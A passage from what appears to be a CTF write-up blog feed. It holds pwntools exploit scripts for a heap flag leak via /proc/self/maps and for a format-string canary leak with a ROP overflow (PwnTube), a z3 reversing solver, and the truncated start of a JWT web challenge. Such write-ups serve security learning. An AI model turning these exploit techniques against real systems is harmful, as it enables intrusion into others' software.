class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./capture_the_flaaaaaaaaaaaaag&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;chall.polygl0ts.ch&#x27;</span>, <span class="number">9003</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./capture_the_flaaaaaaaaaaaaag&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># call `malloc` inside `getline` </span></span><br><span class="line"><span class="comment"># the address that was allocated when `fread` was called is reallocated.</span></span><br><span class="line"><span class="comment"># global variable `feedback` -&gt; heap pointer -&gt; heap (where flag was stored)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># leak pie address</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;/proc/self/maps&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline().strip().split(<span class="string">b&#x27;-&#x27;</span>)[<span class="number">0</span>], <span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">feedback = e.address + <span class="number">0x4050</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(feedback))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get the heap address stored in `feedback`.</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">hex</span>(feedback))</span><br><span class="line">heap = u64(p.recvline().strip().ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line"><span class="comment"># print the flag</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">hex</span>(heap+<span class="number">3</span>)) <span class="comment"># &#x27;A\n\x00&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = p.recvline().strip().decode() </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;EPF&#x27;</span> + flag)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># EPFL&#123;why_h4ve_a_s1ngle_ch4r4ct3r_wh3n_fread_gives_you_7he_wh0l3_fl4g&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Lake </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Srdnlen CTF 2023 - PwnTube (fsb, rop)</title>
      <link href="/231105-srdnlen2023-pwntube/"/>
      <url>/231105-srdnlen2023-pwntube/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2129">https://ctftime.org/event/2129</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 __fastcall <span class="title function_">showComments</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  clearScreen();</span><br><span class="line">  printLogo();</span><br><span class="line">  <span class="built_in">puts</span>(aComments);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = i;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)i &gt;= a2 )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)(<span class="number">30LL</span> * (<span class="type">int</span>)i + a1)); <span class="comment">// fsb</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I can trigger FSB in <code>showComments</code>.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">addComment</span><span class="params">(__int64 a1, <span class="type">int</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// ..</span></span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%7s&quot;</span>, <span class="number">30LL</span> * *a2 + a1);</span><br><span class="line">  <span class="comment">// ..</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>I put FSB payload through the <code>addComment</code>.</p><p>Finally, There is easy bof in <code>buy_premium</code>, I tried to call <code>skipAd</code> using ROP.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">skipAd</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> command[<span class="number">15</span>]; <span class="comment">// [rsp+19h] [rbp-17h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  clearScreen();</span><br><span class="line">  <span class="built_in">strcpy</span>(command, <span class="string">&quot;cat ./flag.txt&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">-559038737</span> &amp;&amp; a2 == <span class="number">-17958194</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\nYou did not give me up :)\nYou earned this:\n&quot;</span>);</span><br><span class="line">    system(command);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    system(<span class="string">&quot;cat ./flag&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./PwnTube&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwntube.challs.srdnlen.it&#x27;</span>, <span class="number">1661</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./PwnTube&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x15aa</span></span><br><span class="line">pop_rsi_rdi = <span class="number">0x15a9</span></span><br><span class="line">ret = <span class="number">0x1016</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># canary leak</span></span><br><span class="line"><span class="comment"># %71$p</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;â”€â”€&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;%71$p&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;â”€â”€&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:D\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(p.recvline().strip(), <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;canary : &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line"></span><br><span class="line"><span class="comment"># pie leak </span></span><br><span class="line"><span class="comment"># %55$p</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;â”€â”€&#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;%55$p&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;â”€â”€&#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;:D\n&#x27;</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">pie_base = <span class="built_in">int</span>(p.recvline().strip(), <span class="number">16</span>) - <span class="number">0x176b</span></span><br><span class="line">info(<span class="string">&#x27;pie : &#x27;</span> + <span class="built_in">hex</span>(pie_base))</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;â”€â”€&#x27;</span>, <span class="string">b&#x27;777&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;â”€â”€&#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;b&#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">504</span></span><br><span class="line">payload += p64(canary)</span><br><span class="line">payload += <span class="string">b&#x27;b&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p64(pie_base + pop_rsi_rdi)</span><br><span class="line">payload += p64(<span class="number">0xFEEDFACE</span>)</span><br><span class="line">payload += p64(<span class="number">0xDEADBEEF</span>)</span><br><span class="line">payload += p64(pie_base + <span class="number">0x12A6</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>, <span class="string">b&#x27;sadf&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># srdnlen&#123;pwn4t1n4?&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Srdnlen </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fsb </tag>
            
            <tag> rop </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3st stage MetaRed CTF 2023 - Maths (rev, z3)</title>
      <link href="/231101-metared2023-maths/"/>
      <url>/231101-metared2023-maths/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2107">https://ctftime.org/event/2107</a></li></ul><blockquote><p>?</p></blockquote><ul><li>[? solves &#x2F; ? points]</li></ul><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">a = [BitVec(<span class="string">f&quot;a<span class="subst">&#123;i:02&#125;</span>&quot;</span>,<span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="comment"># s.add(a[i]&gt;=40 and a[i]&lt;=126) # not working</span></span><br><span class="line">    s.add(And(a[i]&gt;=<span class="number">40</span>, a[i]&lt;=<span class="number">126</span>))</span><br><span class="line"></span><br><span class="line">s.add(a[<span class="number">0</span>] + a[<span class="number">1</span>] == <span class="number">210</span> <span class="keyword">and</span> a[<span class="number">1</span>] | (a[<span class="number">0</span>] == (a[<span class="number">1</span>] | a[<span class="number">0</span>])))</span><br><span class="line">s.add(a[<span class="number">1</span>] * a[<span class="number">2</span>] == <span class="number">10476</span>)</span><br><span class="line">s.add(a[<span class="number">1</span>] + a[<span class="number">0</span>] + a[<span class="number">2</span>] == <span class="number">307</span>)</span><br><span class="line">s.add(a[<span class="number">3</span>] - a[<span class="number">2</span>] == <span class="number">6</span>)</span><br><span class="line">s.add(a[<span class="number">4</span>] != If(a[<span class="number">5</span>] == <span class="number">15</span>, BitVecVal(<span class="number">1</span>, <span class="number">16</span>), BitVecVal(<span class="number">0</span>, <span class="number">16</span>)))</span><br><span class="line">s.add(a[<span class="number">7</span>] * a[<span class="number">4</span>] == <span class="number">6273</span>)</span><br><span class="line">s.add((a[<span class="number">5</span>] | If(a[<span class="number">11</span>] == <span class="number">119</span>, BitVecVal(<span class="number">1</span>, <span class="number">16</span>), BitVecVal(<span class="number">0</span>, <span class="number">16</span>) )) != <span class="number">0</span>)</span><br><span class="line">s.add(a[<span class="number">6</span>] - a[<span class="number">17</span>] == <span class="number">53</span>)</span><br><span class="line">s.add(a[<span class="number">6</span>] + a[<span class="number">5</span>] + a[<span class="number">7</span>] == <span class="number">271</span>)</span><br><span class="line">s.add(a[<span class="number">8</span>] - a[<span class="number">9</span>] == <span class="number">13</span>)</span><br><span class="line">s.add(a[<span class="number">8</span>] + a[<span class="number">9</span>] - a[<span class="number">10</span>] == <span class="number">125</span>)</span><br><span class="line">s.add(a[<span class="number">9</span>] - a[<span class="number">11</span>] == <span class="number">31</span>)</span><br><span class="line">s.add(a[<span class="number">10</span>] - a[<span class="number">11</span>] == <span class="number">1</span>)</span><br><span class="line">s.add(a[<span class="number">13</span>] * a[<span class="number">12</span>] == <span class="number">10260</span>)</span><br><span class="line">s.add(a[<span class="number">13</span>] + a[<span class="number">14</span>] == <span class="number">177</span>)</span><br><span class="line">s.add(And(If(a[<span class="number">17</span>] == <span class="number">69</span>, a[<span class="number">16</span>] != <span class="number">1</span>, a[<span class="number">16</span>] != <span class="number">0</span>), ((a[<span class="number">17</span>] | a[<span class="number">16</span>]) &amp; <span class="number">1</span>) != <span class="number">0</span>))</span><br><span class="line">s.add(a[<span class="number">16</span>] + a[<span class="number">18</span>] == <span class="number">219</span>)</span><br><span class="line">s.add(a[<span class="number">17</span>] + a[<span class="number">16</span>] + a[<span class="number">23</span>] == <span class="number">220</span>)</span><br><span class="line">s.add(a[<span class="number">14</span>] - a[<span class="number">15</span>] == <span class="number">31</span>)</span><br><span class="line">s.add(a[<span class="number">14</span>] + a[<span class="number">12</span>] + a[<span class="number">15</span>] == <span class="number">241</span> <span class="keyword">and</span> (a[<span class="number">14</span>] ^ a[<span class="number">12</span>]) != (a[<span class="number">12</span>] == a[<span class="number">14</span>]) )</span><br><span class="line">s.add(a[<span class="number">17</span>] - a[<span class="number">18</span>] == -<span class="number">50</span>)</span><br><span class="line">s.add(a[<span class="number">19</span>] + a[<span class="number">18</span>] + a[<span class="number">20</span>] == <span class="number">316</span>)</span><br><span class="line">s.add(a[<span class="number">22</span>] + a[<span class="number">21</span>] + a[<span class="number">23</span>] == <span class="number">248</span>)</span><br><span class="line">s.add(a[<span class="number">22</span>] - a[<span class="number">23</span>] == <span class="number">64</span>)</span><br><span class="line">s.add(a[<span class="number">24</span>] + a[<span class="number">25</span>] == <span class="number">207</span>)</span><br><span class="line">s.add(a[<span class="number">24</span>] - a[<span class="number">20</span>] == -<span class="number">32</span>)</span><br><span class="line">s.add(a[<span class="number">25</span>] - a[<span class="number">21</span>] == <span class="number">43</span>)</span><br><span class="line">s.add(a[<span class="number">0</span>] + a[<span class="number">3</span>] == <span class="number">205</span>)</span><br><span class="line">s.add(a[<span class="number">13</span>] + a[<span class="number">12</span>] + a[<span class="number">14</span>] == <span class="number">285</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_list = []</span><br><span class="line">result = <span class="built_in">set</span>()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> s.check() == sat:</span><br><span class="line">    model = s.model()</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span>.join([<span class="built_in">chr</span>(model[a[i]].as_long()) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flag <span class="keyword">not</span> <span class="keyword">in</span> result:</span><br><span class="line">        result.add(flag)</span><br><span class="line">    </span><br><span class="line">    s.add(Or([a[i] != model[a[i]].as_long() <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> flag <span class="keyword">in</span> result:</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;jr3_R43l_R3l=o[rRs3R&#125;</span><br><span class="line">flag&#123;zb3_R43l_R3|-_krRs3R&#125;</span><br><span class="line">flag3.f&#123;_R43l_R3x1cgrRs3R&#125;</span><br><span class="line">flag3,h&#123;_R43l_R3v3eerRs3R&#125;</span><br><span class="line">flag&#123;pl3_R43l_R3r7iarRs3R&#125;</span><br><span class="line">flag31c&#123;_R43l_R3&#123;.`jrRs3R&#125;</span><br><span class="line">flag&#123;kq3_R43l_R3m&lt;n\rRs3R&#125;</span><br><span class="line">flag33a&#123;_R43l_R3&#125;,^lrRs3R&#125;</span><br><span class="line">flag&#123;_&#125;3_R43l_R3aHzPrRs3R&#125;</span><br><span class="line">flag&#123;lp3_R43l_R3n;m]rRs3R&#125;</span><br><span class="line">flag32b&#123;_R43l_R3|-_krRs3R&#125;</span><br><span class="line">flag3-g&#123;_R43l_R3w2dfrRs3R&#125;</span><br><span class="line">flag&#123;`|3_R43l_R3bGyQrRs3R&#125;</span><br><span class="line">flag&#123;we3_R43l_R3y0bhrRs3R&#125;</span><br><span class="line">flag&#123;qk3_R43l_R3s6hbrRs3R&#125;</span><br><span class="line">flag&#123;xd3_R43l_R3z/airRs3R&#125;</span><br><span class="line">flag3+i&#123;_R43l_R3u4fdrRs3R&#125;</span><br><span class="line">flag&#123;ht3_R43l_R3j?qYrRs3R&#125;</span><br><span class="line">flag&#123;|`3_R43l_R3~+]mrRs3R&#125;</span><br><span class="line">flag&#123;om3_R43l_R3q8j`rRs3R&#125;</span><br><span class="line">flag&#123;si3_R43l_R3u4fdrRs3R&#125;</span><br><span class="line">flag3)k&#123;_R43l_R3s6hbrRs3R&#125;</span><br><span class="line">flag3(l&#123;_R43l_R3r7iarRs3R&#125;</span><br><span class="line">flag&#123;mo3_R43l_R3o:l^rRs3R&#125;</span><br><span class="line">flag34`&#123;_R43l_R3~+]mrRs3R&#125;</span><br><span class="line">flag&#123;gu3_R43l_R3i@rXrRs3R&#125;</span><br><span class="line">flag&#123;bz3_R43l_R3dEwSrRs3R&#125;</span><br><span class="line">flag30d&#123;_R43l_R3z/airRs3R&#125;</span><br><span class="line">flag&#123;nn3_R43l_R3p9k_rRs3R&#125;</span><br><span class="line">flag3*j&#123;_R43l_R3t5gcrRs3R&#125;</span><br><span class="line">flag&#123;vf3_R43l_R3x1cgrRs3R&#125;</span><br><span class="line">flag3/e&#123;_R43l_R3y0bhrRs3R&#125;</span><br><span class="line">flag&#123;th3_R43l_R3v3eerRs3R&#125;</span><br><span class="line">flag&#123;^~3_R43l_R3`I&#123;OrRs3R&#125;</span><br><span class="line">flag&#123;ug3_R43l_R3w2dfrRs3R&#125;</span><br><span class="line">flag&#123;dx3_R43l_R3fCuUrRs3R&#125;</span><br><span class="line">flag&#123;rj3_R43l_R3t5gcrRs3R&#125;</span><br><span class="line">flag&#123;is3_R43l_R3k&gt;pZrRs3R&#125;</span><br><span class="line">flag&#123;a&#123;3_R43l_R3cFxRrRs3R&#125;</span><br><span class="line">flag&#123;fv3_R43l_R3hAsWrRs3R&#125;</span><br><span class="line">flag&#123;&#123;a3_R43l_R3&#125;,^lrRs3R&#125;</span><br><span class="line">flag&#123;cy3_R43l_R3eDvTrRs3R&#125;</span><br><span class="line">flag&#123;yc3_R43l_R3&#123;.`jrRs3R&#125;</span><br><span class="line">flag&#123;ew3_R43l_R3gBtVrRs3R&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> MetaRed </category>
          
      </categories>
      
      
        <tags>
            
            <tag> z3 </tag>
            
            <tag> rev </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>3st stage MetaRed CTF 2023 - Master JWT (web)</title>
      <link href="/231027-metared2023-master_jwt/"/>
      <url>/231027-metared2023-master_jwt/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/2107">https://ctftime.org/event/2107</a></li></ul><blockquote><p>With just two requests you can get the flag. Read the code :) Donâ€™t brute-force paths, you have the source code uploaded.</p></blockquote><ul><li>[48 solves &#x2F; 401 points]</li></ul><p>I was toooo happy to solve this web challenge!!</p><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>This is the source code provided.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, jsonify, make_response</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> jwt <span class="keyword">import</span> decode, encode, exceptions</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask_limiter <span class="keyword">import</span> Limiter</span><br><span class="line"><span class="keyword">from</span> flask_limiter.util <span class="keyword">import</span> get_remote_address</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">limiter = Limiter(</span><br><span class="line">    app=app,</span><br><span class="line">    default_limits=[<span class="string">&quot;2 per minute&quot;</span>],</span><br><span class="line">    key_func=get_remote_address,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">random.seed(<span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000</span>)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">app.secret_key = <span class="string">f&quot;Sup3S4f3<span class="subst">&#123;randint(<span class="number">0</span>, <span class="number">1000000000000</span>)&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;CTF&#123;fake_flag&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span 